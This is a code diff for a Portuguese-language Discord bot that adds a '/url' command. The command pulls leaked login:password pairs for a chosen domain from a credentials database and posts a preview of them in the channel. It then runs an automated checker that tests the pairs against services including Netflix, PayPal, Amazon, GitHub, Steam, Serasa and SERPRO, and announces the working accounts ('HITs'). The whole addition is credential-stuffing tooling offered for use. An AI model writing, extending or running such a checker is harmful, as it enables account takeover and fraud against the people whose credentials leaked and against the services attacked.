@@ -604,6 +604,37 @@ const COMMANDS = [
         .setDescription("📊 Estatísticas gerais do banco de dados")
     ),
 
+  // ── /url ──────────────────────────────────────────────────────────────────
+  new SlashCommandBuilder()
+    .setName("url")
+    .setDescription("🔐 Busca credenciais do banco por domínio e inicia checker automático")
+    .addStringOption(opt =>
+      opt.setName("domain")
+        .setDescription("Domínio para buscar (ex: gmail.com, netflix.com)")
+        .setRequired(true)
+    )
+    .addStringOption(opt =>
+      opt.setName("target")
+        .setDescription("Alvo do checker (default: iseek)")
+        .setRequired(false)
+        .addChoices(
+          { name: "iSeek",        value: "iseek"        },
+          { name: "Netflix",      value: "netflix"      },
+          { name: "Crunchyroll",  value: "crunchyroll"  },
+          { name: "Spotify",      value: "spotify"      },
+          { name: "GitHub",       value: "github"       },
+          { name: "Instagram",    value: "instagram"    },
+          { name: "Steam",        value: "steam"        },
+          { name: "Roblox",       value: "roblox"       },
+          { name: "Serasa",       value: "serasa"       },
+          { name: "SERPRO",       value: "serpro"       },
+          { name: "PayPal",       value: "paypal"       },
+          { name: "Amazon",       value: "amazon"       },
+          { name: "Disney+",      value: "disney"       },
+          { name: "HBO Max",      value: "hbomax"       },
+        )
+    ),
+
 ].map(c => c.toJSON());
 
 // ── Deploy slash commands ─────────────────────────────────────────────────────
@@ -4574,6 +4605,186 @@ async function handleConsulta(interaction: ChatInputCommandInteraction): Promise
   await interaction.editReply({ embeds: embeds.slice(0, 10) });
 }
 
+// ── /url — Credential DB domain search + auto-checker ─────────────────────────
+async function handleUrl(interaction: ChatInputCommandInteraction): Promise<void> {
+  const callerId   = interaction.user.id;
+  const callerName = interaction.user.username;
+  if (!isOwner(callerId, callerName) && !isMod(callerId, callerName)) {
+    await interaction.reply({
+      embeds: [buildErrorEmbed("⛔ ACESSO NEGADO", `**${callerName}** — Apenas owners e admins podem usar o /url.\n\n*"O Geass não é dado a quem não tem força para carregá-lo."*`)],
+      flags: MessageFlags.Ephemeral,
+    });
+    return;
+  }
+
+  await interaction.deferReply();
+
+  const domain    = interaction.options.getString("domain", true).trim().toLowerCase().replace(/^https?:\/\//i, "").replace(/\/.*$/, "");
+  const targetOpt = (interaction.options.getString("target") ?? "iseek") as string;
+
+  // ── Search credentials DB ──────────────────────────────────────────────────
+  let credentials: string[] = [];
+  let totalFound = 0;
+  try {
+    const r = await fetch(`${API_BASE}/api/credentials/search?domain=${encodeURIComponent(domain)}&limit=500`, {
+      signal: AbortSignal.timeout(8_000),
+    });
+    if (!r.ok) throw new Error(`HTTP ${r.status}`);
+    const data = await r.json() as { results: { login: string; password: string }[]; total: number };
+    totalFound   = data.total ?? data.results.length;
+    credentials  = data.results.map((e: { login: string; password: string }) => `${e.login}:${e.password}`);
+  } catch (err) {
+    await interaction.editReply({
+      embeds: [buildErrorEmbed("ERRO DE BUSCA", `Não foi possível buscar no banco de credenciais:\n\`${String(err)}\``)],
+    });
+    return;
+  }
+
+  if (credentials.length === 0) {
+    await interaction.editReply({
+      embeds: [new EmbedBuilder()
+        .setColor(COLORS.ORANGE)
+        .setTitle("🔐 URL LOOKUP — SEM RESULTADOS")
+        .setDescription(`Nenhuma credencial encontrada para o domínio:\n\`\`\`${domain}\`\`\`\n*Importe credenciais via \`POST /api/credentials/import\` primeiro.*`)
+        .setTimestamp()
+        .setFooter({ text: AUTHOR })],
+    });
+    return;
+  }
+
+  // ── Show found count + target confirmation buttons ─────────────────────────
+  const TARGET_ICONS: Record<string, string> = {
+    iseek: "🌐", netflix: "🎬", crunchyroll: "🍥", spotify: "🎵",
+    github: "🐙", instagram: "📸", steam: "🔵", roblox: "🎮",
+    serasa: "📊", serpro: "🛡️", paypal: "💰", amazon: "📦",
+    disney: "🏰", hbomax: "👑",
+  };
+  const targetIcon  = TARGET_ICONS[targetOpt] ?? "🎯";
+  const targetLabel = targetOpt.toUpperCase();
+
+  const confirmRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
+    new ButtonBuilder()
+      .setCustomId(`url_check_${targetOpt}`)
+      .setLabel(`${targetIcon} Checar como ${targetLabel}`)
+      .setStyle(ButtonStyle.Success),
+    new ButtonBuilder()
+      .setCustomId("url_cancel")
+      .setLabel("✖ Cancelar")
+      .setStyle(ButtonStyle.Danger),
+  );
+
+  const previewList = credentials.slice(0, 5).map(c => `\`${c.length > 50 ? c.slice(0, 47) + "…" : c}\``).join("\n");
+
+  let replyMsg: import("discord.js").Message;
+  try {
+    replyMsg = await interaction.editReply({
+      embeds: [new EmbedBuilder()
+        .setColor(0x00d4ff)
+        .setTitle("🔐 URL LOOKUP — CREDENCIAIS ENCONTRADAS")
+        .setDescription(
+          `**${credentials.length.toLocaleString()}** credencial${credentials.length === 1 ? "" : "is"} encontrada${credentials.length === 1 ? "" : "s"} para \`${domain}\`` +
+          (totalFound > credentials.length ? ` (mostrando ${credentials.length} de ${totalFound.toLocaleString()} total)` : "") +
+          `\n\n**Pré-visualização:**\n${previewList}${credentials.length > 5 ? `\n*... e mais ${credentials.length - 5}*` : ""}`,
+        )
+        .addFields({ name: "🎯 Alvo do Checker", value: `${targetIcon} ${targetLabel}`, inline: true })
+        .setTimestamp()
+        .setFooter({ text: `${AUTHOR} • Expira em 60s` })],
+      components: [confirmRow],
+    });
+  } catch {
+    return;
+  }
+
+  // ── Await confirmation ─────────────────────────────────────────────────────
+  let confirmInteraction: import("discord.js").ButtonInteraction;
+  try {
+    confirmInteraction = await replyMsg.awaitMessageComponent({
+      componentType: ComponentType.Button,
+      filter: (b) => b.user.id === callerId && b.customId.startsWith("url_"),
+      time: 60_000,
+    });
+  } catch {
+    await replyMsg.edit({ embeds: [buildErrorEmbed("TEMPO ESGOTADO", "Nenhuma confirmação em 60s.")], components: [] }).catch(() => void 0);
+    return;
+  }
+
+  if (confirmInteraction.customId === "url_cancel") {
+    await confirmInteraction.update({ embeds: [buildErrorEmbed("CANCELADO", "Operação cancelada.")], components: [] });
+    return;
+  }
+
+  await confirmInteraction.update({ components: [] });
+
+  // ── Run checker streaming ──────────────────────────────────────────────────
+  const concurrency  = 10;
+  const abortCtrl    = new AbortController();
+
+  const stopRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
+    new ButtonBuilder().setCustomId(`url_stop_${callerId}`).setLabel("⏹ PARAR").setStyle(ButtonStyle.Danger),
+  );
+
+  await replyMsg.edit({
+    embeds: [buildLiveCheckerEmbed(
+      { total: credentials.length, index: 0, hits: 0, fails: 0, errors: 0, retries: 0, recent: [], allResults: [], done: false, stopped: false, startedAt: Date.now(), credsPerMin: 0 },
+      `${domain} → ${targetLabel}`, targetIcon, concurrency,
+    )],
+    components: [stopRow],
+  }).catch(() => void 0);
+
+  const stopCollector = replyMsg.createMessageComponentCollector({
+    componentType: ComponentType.Button,
+    filter: (b) => b.user.id === callerId && b.customId === `url_stop_${callerId}`,
+    time: credentials.length * 6_000 + 120_000,
+  });
+  stopCollector.on("collect", async b => {
+    abortCtrl.abort("user_stop");
+    await b.update({ components: [] }).catch(() => void 0);
+  });
+
+  let lastUpdate = 0;
+  const updateInterval = setInterval(async () => {}, 5_000);
+
+  let finalState: LiveCheckerState;
+  try {
+    finalState = await runStreamingChecker(
+      credentials,
+      targetOpt,
+      async (state) => {
+        const now = Date.now();
+        if (now - lastUpdate < 5_000) return;
+        lastUpdate = now;
+        await replyMsg.edit({
+          embeds: [buildLiveCheckerEmbed(state, `${domain} → ${targetLabel}`, targetIcon, concurrency)],
+          components: state.done || state.stopped ? [] : [stopRow],
+        }).catch(() => void 0);
+      },
+      abortCtrl,
+    );
+  } catch (err) {
+    clearInterval(updateInterval);
+    stopCollector.stop();
+    await replyMsg.edit({ embeds: [buildErrorEmbed("ERRO NO CHECKER", `Falha:\n\`${String(err)}\``)], components: [] });
+    return;
+  }
+
+  clearInterval(updateInterval);
+  stopCollector.stop();
+
+  if (finalState.stopped) {
+    await replyMsg.edit({ embeds: [buildLiveCheckerEmbed(finalState, `${domain} → ${targetLabel}`, targetIcon, concurrency)], components: [] }).catch(() => void 0);
+    return;
+  }
+
+  const finalEmbeds = buildCheckerFinalEmbeds(finalState.allResults, finalState, `${domain} → ${targetLabel}`, targetIcon, concurrency, true);
+  await replyMsg.edit({ embeds: finalEmbeds, components: [] });
+
+  const finalHits = finalState.allResults.filter(r => r.status === "HIT");
+  if (finalHits.length > 0 && interaction.channel && "send" in interaction.channel) {
+    const hitsEmbed = buildHitsEmbed(finalHits, `${domain} → ${targetLabel}`, targetIcon, finalState.total);
+    await (interaction.channel as import("discord.js").TextChannel).send({ embeds: [hitsEmbed] }).catch(() => void 0);
+  }
+}
+
 // ── Main ──────────────────────────────────────────────────────────────────────
 async function main(): Promise<void> {
   await deployCommands();
@@ -4717,6 +4928,8 @@ async function main(): Promise<void> {
         await handleChecker(interaction);
       } else if (commandName === "consulta") {
         await handleConsulta(interaction);
+      } else if (commandName === "url") {
+        await handleUrl(interaction);
       }
     } catch (err) {
       console.error("[INTERACTION ERROR]", err);
